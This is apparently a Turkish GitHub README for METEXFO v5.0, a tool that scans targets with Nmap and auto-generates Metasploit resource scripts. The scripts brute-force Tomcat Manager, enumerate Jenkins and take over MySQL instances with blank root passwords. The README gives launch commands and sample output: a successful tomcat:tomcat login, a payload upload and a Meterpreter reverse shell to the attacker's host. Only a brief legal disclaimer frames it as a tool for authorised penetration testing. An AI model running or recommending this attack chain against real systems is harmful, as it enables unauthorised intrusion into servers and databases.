# 💀 METEXFO v5.0 | Modern Logic & Misconfig Agent

<p align="center">
<img src="https://shields.io">
<img src="https://img.shields.io/badge/LANGUAGE-PYTHON3-blue?style=for-the-badge&logo=python">
<img src="https://img.shields.io/badge/PLATFORM-KALI_LINUX-green?style=for-the-badge&logo=linux">
<img src="https://img.shields.io/badge/LICENSE-MIT-yellow?style=for-the-badge">
</p>

<p align="center">
  <img src="https://i.hizliresim.com/gu9vdo8.gif" width="600" alt="METEXFO Banner">
</p>

<p align="center">
<i>VERSION 5.0 METEXFO - MODERN TEMPLATE-BASED RECON & EXPLOIT ORCHESTRATOR</i>
</p>

---

## 🌌 Genel Bakış
**METEXFO v5.0**, klasik versiyon tarama araçlarının ötesine geçerek hedef ağlardaki **kritik yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** avlayan modern bir siber güvenlik otomasyon ajanıdır. 

Birden fazla hedefi eşzamanlı (Multi-threading) olarak tarar, akıllı şablon veritabanı ile eşleştirir ve **Metasploit Framework** için tam otomatik bir saldırı planı (`.rc`) üretir. İşlem bittiğinde, derinlemesine log analizi yaparak sızma başarı durumunu önünüze serer.

### 🛡️ Neden METEXFO v5.0?

| Özellik | Açıklama |
| :--- | :--- |
| **Multi-Threading** | Eşzamanlı iş parçacığı (Thread-safe Kuyruk) mimarisiyle ultra hızlı çoklu hedef taraması. |
| **Misconfig Focus** | Yazılım açıklarından ziyade Apache Tomcat, Jenkins, MySQL gibi servislerdeki zayıf/boş şifre yapılandırmalarını hedefler. |
| **Dinamik RC Üretimi** | SSL/TLS durumları dahil olmak üzere hedefe özel Metasploit kaynak kodlarını otomatik yazar. |
| **Derin Log Analizi** | `--analyze` motoru sayesinde Metasploit loglarını tarayarak kritik sızma başarılarını raporlar. |

---

## 🛠️ Kurulum & Gereksinimler

Sisteminizde `Nmap` ve `python-nmap`, `colorama` kütüphanelerinin kurulu olduğundan emin olun:

```bash
# Sistem paketlerini güncelleyin ve Nmap kurun
sudo apt update && sudo apt install nmap -y

# Depoyu klonlayın ve dizine geçin
git clone https://github.com/ghost0x02/metexfo
cd METEXFO

# Gerekli Python kütüphanelerini yükleyin
pip3 install python-nmap colorama
```

---

## 🚀 Kullanım Kılavuzu

METEXFO v5.0 iki temel modda çalışır: **Operasyon Planı Hazırlama** ve **Post-Saldırı Log Analizi**.

### 1. Keşif ve Otomatik Operasyon Planı Üretimi
Tek veya virgülle ayrılmış çoklu hedefleri taramak ve Metasploit reçetesi oluşturmak için:
```bash
python3 mme5.py -t <HEDEF_IP_VEYA_LISTESI> -l <KENDİ_LHOST_IP_ADRESİNİZ>

# Örnek (Çoklu Hedef Taraması):
python3 mme5.py -t 192.168.1.50,192.168.1.60 -l 192.168.1.10
```

### 2. Metasploit Üzerinde Otomatik Saldırıyı Tetikleme
Üretilen modern operasyon planını çalıştırmak için terminalde şu komutu girmeniz yeterlidir:
```bash
msfconsole -q -r metexfo_final_agent.rc
```

### 3. Derin Log Analiz Motorunu Çalıştırma
Saldırı oturumu kapandıktan sonra, elde edilen başarıları ve sızılan panelleri raporlamak için:
```bash
python3 mme5.py -t 192.168.1.50 -l 192.168.1.10 --analyze
```

---

## 🔰 Örnek İşlem Çıktıları

### A. Tarama ve Hazırlık Aşaması:
```text
    METEXFO

 >> STATUS: MODERN LOGIC AGENT | VERSION : 5.0 | TEMPLATE-BASED RECON
 >> TARGETS: 2 | LHOST: 192.168.1.10 | MODE: MODERN-MISCONFIG-SCAN

[*] Modern İstek Taraması Başladı: 192.168.1.50
[FOUND] 192.168.1.50 -> Port 8080 (http Apache Tomcat/9.0)
[+] ANALİZ: 192.168.1.50 | PORT: 8080 --> http apache tomcat/9.0
[MODERN-TEMPLATE] Apache Tomcat Yönetim Paneli Tespiti modülü hazırlanıyor...

[+] MODERN OPERASYON PLANI HAZIR: metexfo_final_agent.rc
[*] Metasploit ile çalıştırmak için:
msfconsole -q -r metexfo_final_agent.rc
```

### B. Hack İşlemi Başarılı Olduğunda Alınan Canlı Sızma Çıktısı:
Metasploit planı tetiklediğinde ve hedef panel zayıf şifrelerle kırıldığında elde edilen **Meterpreter komut satırı** bağlantısı:
```text
[+] 192.168.1.50:8080 - Tomcat Manager / manager/html LOGIN SUCCESSFUL: tomcat:tomcat
[*] Uploading payload...
[*] Executing payload...
[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49231)

meterpreter > sysinfo
Computer        : METEXFO-VICTIM-SVR
OS              : Ubuntu 22.04.3 LTS (Linux 5.15.0)
Architecture    : x64
meterpreter > _
```

### C. Modern Analiz Motoru Raporu (`--analyze`):
```text
[*] Modern Log Analiz Motoru Çalıştırılıyor...

--- MODERN ANALİZ RAPORU ---
[CRITICAL] BAŞARI: Apache Tomcat yönetim paneli zayıf kimlik bilgisiyle ele geçirildi!
[CRITICAL] BAŞARI: MySQL veritabanına şifresiz/boş parolarla erişim sağlandı!
----------------------------
```

---

## 📊 Modern Zafiyet Şablonları Veritabanı (v5.0)
Şu anki güncel şablon mimarisi aşağıdaki kritik servislere doğrudan odaklanmaktadır:
* **HTTP / HTTPS (80, 443, 8080):** Apache Tomcat Manager Login (Brute-Force), Jenkins Automation Enumeration, Web Directory Scanner.
* **MySQL (3306):** Root Blank Password Check & Takeover modülü.

---

## ⚖️ Yasal Uyarı
Bu araç yalnızca yasal sızma testleri, güvenlik araştırmaları ve eğitim amaçlı geliştirilmiştir. İzin alınmamış sistemler üzerinde kullanılması yasal sorumluluk doğurabilir. Kullanıcı, doğabilecek tüm hukuki sonuçlardan kendisi sorumludur.

**Developer:** `GHOST0X02` | **Version:** `5.0-Elite`
